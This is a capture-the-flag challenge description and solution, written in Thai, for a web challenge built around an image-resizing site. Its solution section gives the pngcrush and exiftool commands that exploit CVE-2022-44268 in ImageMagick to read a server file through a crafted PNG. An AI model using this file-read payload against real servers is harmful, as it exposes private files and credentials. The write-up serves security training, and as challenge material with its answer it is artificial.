# QuickScale Studio

| Category | Difficulty | Point |
| :-: | :-: | :-: |
| Web Application | Hard | 500 |

สมชายเขาได้ประสบปัญหากับการที่จะที่อยากย่อขนาดรูป แต่ด้วยที่เขาเป็น dev สุดเท่ห์ การจะเข้าไปตัดรูปใน photoshop คงง่ายเกินไปสำหรับเขา เขาจึงทำเว็บไซต์ที่สามารถ ย่อภาพได้ตั้งแต่ 25% - 100% และด้วยการที่จะทำแล้วไว้ใช้คนเดียวคงจะน่าเสียดายแย่ เขาจึงเปิดให้ใช้ฟรี และเวลาก็ล่วงเลยมามากกว่า 2 ปี ในฐานะที่คุณเป็น Cyber Security คุณจึงแนะนำให้ สมชายเช็ค github repo project ว่าโดนเตือนเรื่อง ใช้ version ที่มีช่องโหว่ไหม แต่เขาไม่สนใจ เพราะเขามั่นใจว่าเรามีระบบป้องกันการโดย injection อย่างดี และบอกกับคุณว่าถ้าแน่จริงก็ลอง hack แล้วบอกว่าค่าในไฟล์ `/tmp/flag.txt` คืออะไรหน่อยสิ ทำไม่ได้ละสิหึ

Format: `CSUBRU{...}`

---

No hint

---

Image: `ic-quick-scale-studio`

---

ใช้ CVE-2022-44268 เพื่ออ่านไฟล์ /tmp/flag.txt
ตัวอย่างคำสั่ง craft payload
```bash
pngcrush -text a "profile" "/tmp/flag.txt" Arona.png out.png
```

ให้อัพแล้วโหลดกลับมาแล้วใช้
```bash
exiftool -b filename.png
```
